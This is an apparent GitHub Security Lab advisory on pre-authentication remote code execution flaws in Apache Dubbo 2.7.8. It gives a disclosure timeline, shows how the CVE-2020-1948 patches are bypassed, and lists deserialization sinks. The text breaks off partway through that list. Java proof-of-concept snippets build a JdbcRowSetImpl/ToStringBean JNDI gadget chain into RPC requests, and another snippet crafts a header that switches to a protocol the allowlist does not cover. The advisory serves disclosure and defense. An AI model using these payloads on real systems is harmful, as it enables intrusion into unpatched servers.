<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">June 22, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-034_043: Multiple pre-auth RCEs in Apache Dubbo - CVE-2021-25641, CVE-2021-30179, CVE-2021-30180, CVE-2021-30181, CVE-2021-32824</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-02-08: Reported to Apache Security Team <a href="mailto:security@apache.org">security@apache.org</a> and security@dubbo.apache.org</li>
  <li>2021-03-01: Got acknowledgment from the Apache Dubbo team. Some issues were addressed by 2.7.9 version in the meantime. Apache Dubbo team claims Telnet has a mechanism to control whether to open or receive external network requests.</li>
  <li>2021-03-01: Sent a PoC to show Telnet control mechanism are not applicable to the vector reported.</li>
  <li>2021-05-28: Apache Dubbo notifies patches are released as part of 2.7.10 and 2.6.10</li>
</ul>

<h2 id="summary">Summary</h2>
<p>Multiple vulnerabilities have been found in Apache Dubbo enabling attackers to compromise and run arbitrary system commands on both Dubbo consumers and providers.</p>

<h2 id="product">Product</h2>
<p>Apache Dubbo</p>

<h2 id="tested-version">Tested Version</h2>
<p>Dubbo v2.7.8</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-bypass-cve-2020-1948-mitigations-ghsl-2021-034">Issue 1: Bypass CVE-2020-1948 mitigations (GHSL-2021-034)</h3>
<p>CVE-2020-1948 describes a vulnerability where an attacker can send RPC requests with an unrecognized service or method name along with malicious parameter payloads. When the malicious parameter is deserialized, it will execute malicious code</p>

<p>Looking through the commit history, it seems that the patch involved several pull requests which also addressed a bypass which had been made public later:<br />
1 - Prevent specific gadget chain by removing RPC invocation arguments when printing RPC exception <a href="https://github.com/apache/dubbo/pull/5255">PR</a><br />
2 - Prevent RPC argument deserialization when service/method is not found <a href="https://github.com/apache/dubbo/pull/5733">PR</a><br />
3 - Enforce parameter type check when processing calls to <code class="language-plaintext highlighter-rouge">$invoke</code>, <code class="language-plaintext highlighter-rouge">$invokeAsync</code> and <code class="language-plaintext highlighter-rouge">$echo</code> <a href="https://github.com/apache/dubbo/pull/6374">PR</a></p>

<p>The initial issue (2) involved the <a href="https://github.com/chickenlj/incubator-dubbo/blob/cb5d18346d05c9f0f37bf25f850d95ee41b735ad/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcInvocation.java#L139">deserialization</a> of objects from the RPC request input stream even for non-existing services and methods.</p>

<p>The initial patch prevented the <a href="https://github.com/chickenlj/incubator-dubbo/blob/effd4a25d8dadcd08a30589109c97d86cbd607d2/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcInvocation.java#L133-L135">deserialization of the RPC invocation object for unknown services/methods</a>. However, it was still allowed when calling the <code class="language-plaintext highlighter-rouge">Generic</code> or <code class="language-plaintext highlighter-rouge">Echo</code> services. An attacker could just use any of the <code class="language-plaintext highlighter-rouge">Generic</code> or <code class="language-plaintext highlighter-rouge">Echo</code> service method names (<code class="language-plaintext highlighter-rouge">$invoke</code>, <code class="language-plaintext highlighter-rouge">$invokeAsync</code> or <code class="language-plaintext highlighter-rouge">$echo</code>) to reach the deserialization code and trigger the vulnerability. This bypass was addressed by enforcing the RPC call argument types to match those defined by the <code class="language-plaintext highlighter-rouge">Generic</code> or <code class="language-plaintext highlighter-rouge">Echo</code> service method parameter types (3).</p>

<p>However, as pointed out in <a href="https://github.com/apache/dubbo/pull/6374#issuecomment-651506645">this comment</a>, the patch is not enough. Both <code class="language-plaintext highlighter-rouge">$invoke</code>, <code class="language-plaintext highlighter-rouge">$invokeAsync</code> and <code class="language-plaintext highlighter-rouge">$echo</code> take <code class="language-plaintext highlighter-rouge">java.lang.Object</code> arguments which allow an attacker to send any arbitrary gadget chain since all Java objects extend from <code class="language-plaintext highlighter-rouge">java.lang.Object</code>.</p>

<p>In addition, since the gadget chain used to demonstrate this issue required a call to the <code class="language-plaintext highlighter-rouge">toString</code> method on the deserialized object, an additional and maybe unrelated fix was introduced to prevent the call to the <code class="language-plaintext highlighter-rouge">toString</code> method for RPC deserialized arguments in (1).</p>

<p>To date (v2.7.8) CVE-2020-1948 is still exploitable by either placing the gadget payload in a <code class="language-plaintext highlighter-rouge">$echo</code>, <code class="language-plaintext highlighter-rouge">$invoke</code> or <code class="language-plaintext highlighter-rouge">$invokeAsync</code> argument and either:
A) use a gadget chain that does not require a later call to the <code class="language-plaintext highlighter-rouge">toString</code> method or<br />
B) relies on calls to the <code class="language-plaintext highlighter-rouge">toString</code> method which have not been sanitized/stripped out of deserialized objects.</p>

<p>For A), it is possible to craft a <code class="language-plaintext highlighter-rouge">HashMap</code> with colliding keys so that the deserialization will trigger the <code class="language-plaintext highlighter-rouge">hashCode</code> method of each item stored in the <code class="language-plaintext highlighter-rouge">HashMap</code>, and then use a helper gadget to trigger the dangerous <code class="language-plaintext highlighter-rouge">toString</code> method. This way, the malicious code will get executed during the deserialization and will not require a later call to the <code class="language-plaintext highlighter-rouge">toString</code> method on the deserialized object. This seems to be related with <a href="https://lists.apache.org/thread.html/r5b2df4ef479209dc4ced457b3d58a887763b60b9354c3dc148b2eb5b%40%3Cdev.dubbo.apache.org%3E"><code class="language-plaintext highlighter-rouge">CVE-2020-11995</code></a>.</p>

<p>For B), it is possible to find other places in the code where the <code class="language-plaintext highlighter-rouge">toString</code> method will be called on a deserialized object. For example, in addition to the RPC arguments, the RPC call attachments will also get <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcInvocation.java#L153-L161">deserialized from untrusted input</a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readAttachments</span><span class="o">();</span>
<span class="k">if</span> <span class="o">(</span><span class="n">map</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">map</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">attachment</span> <span class="o">=</span> <span class="n">getObjectAttachments</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">attachment</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">attachment</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
    <span class="o">}</span>
    <span class="n">attachment</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
    <span class="n">setObjectAttachments</span><span class="o">(</span><span class="n">attachment</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>And they will <a href="https://github.com/apache/dubbo/blob/66e8abc00effbf68c93b68dac04790aa1fd22ede/dubbo-compatible/src/main/java/com/alibaba/dubbo/rpc/RpcInvocation.java#L205">be included in the <code class="language-plaintext highlighter-rouge">Invocation.toString</code> method</a> but they will not be cleared by the call to <code class="language-plaintext highlighter-rouge">getInvocationWithoutData</code> at <code class="language-plaintext highlighter-rouge">DubboProtocol:263</code>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="o">(</span><span class="n">exporter</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RemotingException</span><span class="o">(</span><span class="n">channel</span><span class="o">,</span> <span class="s">"Not found exported service: "</span> <span class="o">+</span> <span class="n">serviceKey</span> <span class="o">+</span> <span class="s">" in "</span> <span class="o">+</span> <span class="n">exporterMap</span><span class="o">.</span><span class="na">keySet</span><span class="o">()</span> <span class="o">+</span> <span class="s">", may be version or group mismatch "</span> <span class="o">+</span>
                    <span class="s">", channel: consumer: "</span> <span class="o">+</span> <span class="n">channel</span><span class="o">.</span><span class="na">getRemoteAddress</span><span class="o">()</span> <span class="o">+</span> <span class="s">" --&gt; provider: "</span> <span class="o">+</span> <span class="n">channel</span><span class="o">.</span><span class="na">getLocalAddress</span><span class="o">()</span> <span class="o">+</span> <span class="s">", message:"</span> <span class="o">+</span> <span class="n">getInvocationWithoutData</span><span class="o">(</span><span class="n">inv</span><span class="o">));</span>
        <span class="o">}</span>
</code></pre></div></div>

<p>We can prepare use the following PoC request to trigger the <code class="language-plaintext highlighter-rouge">toString</code> call and unroll the gadget chain:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">JdbcRowSetImpl</span> <span class="n">impl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JdbcRowSetImpl</span><span class="o">();</span>
<span class="n">impl</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="no">JNDI_URL</span><span class="o">);</span>
<span class="n">impl</span><span class="o">.</span><span class="na">setMatchColumn</span><span class="o">(</span><span class="s">"foo"</span><span class="o">);</span>
<span class="nc">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ToStringBean</span><span class="o">(</span><span class="nc">JdbcRowSetImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">impl</span><span class="o">);</span>

<span class="c1">// 1.dubboVersion</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"2.7.8"</span><span class="o">);</span>
<span class="c1">// 2.path</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"foo"</span><span class="o">);</span>
<span class="c1">// 3.version</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">""</span><span class="o">);</span>
<span class="c1">// 4.methodName</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"$echo"</span><span class="o">);</span>
<span class="c1">// 5.methodDesc</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"Ljava/lang/Object;"</span><span class="o">);</span>
<span class="c1">// 6.paramsObject</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="s">"foo"</span><span class="o">);</span>
<span class="c1">// 7.map</span>
<span class="nc">HashMap</span> <span class="n">attachments</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
<span class="n">attachments</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"pwn"</span><span class="o">,</span> <span class="n">toStringBean</span><span class="o">);</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">attachments</span><span class="o">);</span>
</code></pre></div></div>

<p>Additionally we can reach a <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboProtocol.java#L140">different <code class="language-plaintext highlighter-rouge">toString</code> call</a> which requires us to add an additional attachment to exercise the <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboProtocol.java#L122"><code class="language-plaintext highlighter-rouge">IS_CALLBACK_SERVICE_INVOKE</code></a> branch:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">JdbcRowSetImpl</span> <span class="n">impl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JdbcRowSetImpl</span><span class="o">();</span>
<span class="n">impl</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="no">JNDI_URL</span><span class="o">);</span>
<span class="n">impl</span><span class="o">.</span><span class="na">setMatchColumn</span><span class="o">(</span><span class="s">"foo"</span><span class="o">);</span>
<span class="nc">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ToStringBean</span><span class="o">(</span><span class="nc">JdbcRowSetImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">impl</span><span class="o">);</span>

<span class="c1">// 1.dubboVersion</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"2.7.8"</span><span class="o">);</span>
<span class="c1">// 2.path</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="no">SERVICE_NAME</span><span class="o">);</span>
<span class="c1">// 3.version</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">""</span><span class="o">);</span>
<span class="c1">// 4.methodName</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"$echo"</span><span class="o">);</span>
<span class="c1">// 5.methodDesc</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeString</span><span class="o">(</span><span class="s">"Ljava/lang/Object;"</span><span class="o">);</span>
<span class="c1">// 6.paramsObject</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">toStringBean</span><span class="o">);</span>
<span class="c1">// 7.map</span>
<span class="nc">HashMap</span> <span class="n">attachments</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
<span class="n">attachments</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"_isCallBackServiceInvoke"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>
<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">attachments</span><span class="o">);</span>
</code></pre></div></div>

<p>There may be other places calling the deserialized argument’s <code class="language-plaintext highlighter-rouge">toString</code> method such as in the <code class="language-plaintext highlighter-rouge">TraceFilter</code>:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span> <span class="s">"("</span> <span class="o">+</span> <span class="no">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">invocation</span><span class="o">.</span><span class="na">getArguments</span><span class="o">())</span> <span class="o">+</span> <span class="s">")"</span> <span class="o">+</span> <span class="s">" -&gt; "</span> <span class="o">+</span> <span class="no">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">getValue</span><span class="o">())</span>
</code></pre></div></div>

<p>Also, as explained in <a href="http://www.lmxspace.com/2020/08/24/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">this blog post</a> <code class="language-plaintext highlighter-rouge">Hessian2Input.readUTF</code> may lead to <code class="language-plaintext highlighter-rouge">Hessian2Input.readObject</code> and then a call to <code class="language-plaintext highlighter-rouge">toString</code> on the deserialized object. <code class="language-plaintext highlighter-rouge">readUTF</code> is used, for example, <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcInvocation.java#L103">to read the dubbo version</a> from the RPC invocation header, so sending the payload as the dubbo version will get it deserialized and triggered.</p>

<h4 id="impact">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-2-bypass-hessian2-allowlist-via-alternative-protocols-ghsl-2021-035">Issue 2: Bypass Hessian2 allowlist via alternative protocols (GHSL-2021-035)</h3>
<p>As an additional opt-in security control Dubbo added support to enable an <a href="https://github.com/apache/dubbo/pull/6378">allowlist</a> of types that can be deserialized.</p>

<p>However, other deserialization protocols have not been protected in a similar way. The serialization protocol is specified in the RPC call header and can be any of:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 2 -&gt; "hessian2"
 3 -&gt; "java"
 4 -&gt; "compactedjava"
 6 -&gt; "fastjson"
 7 -&gt; "nativejava"
 8 -&gt; "kryo"
 9 -&gt; "fst"
 10 -&gt; "native-hessian"
 11 -&gt; "avro"
 12 -&gt; "protostuff"
 16 -&gt; "gson"
 21 -&gt; "protobuf-json"
 22 -&gt; "protobuf"
 25 -&gt; "kryo2"
</code></pre></div></div>

<p>To prevent attackers from forcing a native Java deserialization, the serialization Id is checked against the value specified by the server provider. If the attacker tries to enforce any Java deserialization (java, nativejava or compactedjava) which was not configured by the service provider, the application will throw an Exception:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">Serialization</span> <span class="nf">getSerialization</span><span class="o">(</span><span class="no">URL</span> <span class="n">url</span><span class="o">,</span> <span class="nc">Byte</span> <span class="n">id</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="nc">Serialization</span> <span class="n">serialization</span> <span class="o">=</span> <span class="n">getSerializationById</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
    <span class="nc">String</span> <span class="n">serializationName</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="nc">Constants</span><span class="o">.</span><span class="na">SERIALIZATION_KEY</span><span class="o">,</span> <span class="nc">Constants</span><span class="o">.</span><span class="na">DEFAULT_REMOTING_SERIALIZATION</span><span class="o">);</span>
    <span class="c1">// Check if "serialization id" passed from network matches the id on this side(only take effect for JDK serialization), for security purpose.</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">serialization</span> <span class="o">==</span> <span class="kc">null</span>
            <span class="o">||</span> <span class="o">((</span><span class="n">id</span> <span class="o">==</span> <span class="no">JAVA_SERIALIZATION_ID</span> <span class="o">||</span> <span class="n">id</span> <span class="o">==</span> <span class="no">NATIVE_JAVA_SERIALIZATION_ID</span> <span class="o">||</span> <span class="n">id</span> <span class="o">==</span> <span class="no">COMPACTED_JAVA_SERIALIZATION_ID</span><span class="o">)</span>
            <span class="o">&amp;&amp;</span> <span class="o">!(</span><span class="n">serializationName</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="no">ID_SERIALIZATIONNAME_MAP</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">id</span><span class="o">)))))</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">(</span><span class="s">"Unexpected serialization id:"</span> <span class="o">+</span> <span class="n">id</span> <span class="o">+</span> <span class="s">" received from network, please check if the peer send the right id."</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">serialization</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>However, the rest of the protocols are allowed and can be enforced by the attacker and most of them can lead to remote code execution.</p>

<p>For example, <code class="language-plaintext highlighter-rouge">native-hessian</code> is similar to <code class="language-plaintext highlighter-rouge">hessian2</code> but does not support allowlists so even in the case that the developers would set an allowlist for <code class="language-plaintext highlighter-rouge">hessian2</code>, attackers would still be able to change the protocol to <code class="language-plaintext highlighter-rouge">native-hessian</code> and evade it.</p>

<p>In addition, both <code class="language-plaintext highlighter-rouge">kryo</code> and <code class="language-plaintext highlighter-rouge">kryo2</code> use the <a href="https://github.com/apache/dubbo/blob/master/dubbo-serialization/dubbo-serialization-kryo/src/main/java/org/apache/dubbo/common/serialize/kryo/CompatibleKryo.java"><code class="language-plaintext highlighter-rouge">CompatibleKryo</code></a> class to get around the limitation of requiring a default constructor which greatly increases the number of gadgets that can be used by an attacker. In addition, Kryo will default to Java native serialization for <a href="https://github.com/apache/dubbo/blob/2d9583adf26a2d8bd6fb646243a9fe80a77e65d5/dubbo-serialization/dubbo-serialization-kryo/src/main/java/org/apache/dubbo/common/serialize/kryo/utils/AbstractKryoFactory.java#L97">Exceptions</a>, <a href="https://github.com/apache/dubbo/blob/2d9583adf26a2d8bd6fb646243a9fe80a77e65d5/dubbo-serialization/dubbo-serialization-kryo/src/main/java/org/apache/dubbo/common/serialize/kryo/utils/AbstractKryoFactory.java#L100">InvocationHandlers</a> and for <a href="https://github.com/apache/dubbo/blob/master/dubbo-serialization/dubbo-serialization-kryo/src/main/java/org/apache/dubbo/common/serialize/kryo/CompatibleKryo.java#L37-L51">any non <code class="language-plaintext highlighter-rouge">java\..*</code> or <code class="language-plaintext highlighter-rouge">javax\..*</code> classes that have no default constructor</a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="o">(!</span><span class="nc">ReflectionUtils</span><span class="o">.</span><span class="na">isJdk</span><span class="o">(</span><span class="n">type</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">type</span><span class="o">.</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">type</span><span class="o">.</span><span class="na">isEnum</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nc">ReflectionUtils</span><span class="o">.</span><span class="na">checkZeroArgConstructor</span><span class="o">(</span><span class="n">type</span><span class="o">))</span> <span class="o">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nf">JavaSerializer</span><span class="o">();</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>Note that to use some of these deserializers, they need to be available in the classpath, either because the provider explicitly imports them or because they are transitively imported by other dependencies.</p>

<p>To change the default protocol, the attacker only needs to set the serialization id in the RPC request header:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// header.</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">header</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">16</span><span class="o">];</span>

<span class="c1">// set magic number.</span>
<span class="nc">Bytes</span><span class="o">.</span><span class="na">short2bytes</span><span class="o">((</span><span class="kt">short</span><span class="o">)</span> <span class="mh">0xdab</span><span class="o">,</span> <span class="n">header</span><span class="o">);</span>

<span class="c1">// set request and serialization flag.</span>
<span class="c1">// 2 -&gt; "hessian2"</span>
<span class="c1">// 3 -&gt; "java"</span>
<span class="c1">// 4 -&gt; "compactedjava"</span>
<span class="c1">// 6 -&gt; "fastjson"</span>
<span class="c1">// 7 -&gt; "nativejava"</span>
<span class="c1">// 8 -&gt; "kryo"</span>
<span class="c1">// 9 -&gt; "fst"</span>
<span class="c1">// 10 -&gt; "native-hessian"</span>
<span class="c1">// 11 -&gt; "avro"</span>
<span class="c1">// 12 -&gt; "protostuff"</span>
<span class="c1">// 16 -&gt; "gson"</span>
<span class="c1">// 21 -&gt; "protobuf-json"</span>
<span class="c1">// 22 -&gt; "protobuf"</span>
<span class="c1">// 25 -&gt; "kryo2"</span>
<span class="n">header</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="o">(</span><span class="no">FLAG_REQUEST</span> <span class="o">|</span> <span class="mi">2</span><span class="o">);</span>
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-3-pre-auth-rce-via-multiple-hessian-deserializations-in-the-rpc-invocation-decoder-ghsl-2021-036">Issue 3: Pre-auth RCE via multiple Hessian deserializations in the RPC invocation decoder (GHSL-2021-036)</h3>
<p>In addition to the deserialization of the RPC call arguments reported in CVE-2020-1938, there are multiple other places where bits of the RPC request get deserialized:</p>

<p>For invocations <a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L88-L103">not conforming with the Dubbo protocol magic number</a> an attacker can place the deserialization payload in multiple places such as:</p>

<ul>
  <li><a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L155">Response HeartBeat</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeHeartbeatData</code> -&gt; <code class="language-plaintext highlighter-rouge">decodeEventData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readEvent</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L159">Response</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeResponseData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L157">Response Event</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeEventData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readEvent</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L182">Request HeartBeat</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeHeartbeatData</code> -&gt; <code class="language-plaintext highlighter-rouge">decodeEventData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readEvent</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L186">Request</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeRequestData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L184">Request Event</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeEventData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readEvent</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
</ul>

<p>For invocations (<a href="https://github.com/apache/dubbo/blob/master/dubbo-remoting/dubbo-remoting-api/src/main/java/org/apache/dubbo/remoting/exchange/codec/ExchangeCodec.java#L122">conforming to Dubbo protocol magic number</a>) the serialization payload can be placed in the following places:</p>

<ul>
  <li><a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L83">Ok Response Event</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeEventData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readEvent</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L89">Ok Response Result</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">DecodeableRpcResult.decode()</code>
        <ul>
          <li>Note: an attacker can send data in the order we want</li>
          <li><code class="language-plaintext highlighter-rouge">handleValue</code> should lead to <code class="language-plaintext highlighter-rouge">readObject</code> even if <code class="language-plaintext highlighter-rouge">invocation</code> is null</li>
          <li><code class="language-plaintext highlighter-rouge">handleException</code> leads to <code class="language-plaintext highlighter-rouge">readThrowable</code> which leads to <code class="language-plaintext highlighter-rouge">readObject</code></li>
          <li><code class="language-plaintext highlighter-rouge">handleAttachment</code> leads to <code class="language-plaintext highlighter-rouge">readAttachments</code> which leads to <code class="language-plaintext highlighter-rouge">readObject</code></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L100">Not Ok Response</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">in.readUTF</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L122">Request Event</a>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">decodeEventData</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readEvent</code> -&gt; <code class="language-plaintext highlighter-rouge">in.readObject</code></li>
    </ul>
  </li>
  <li><a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L127">Request</a>
    <ul>
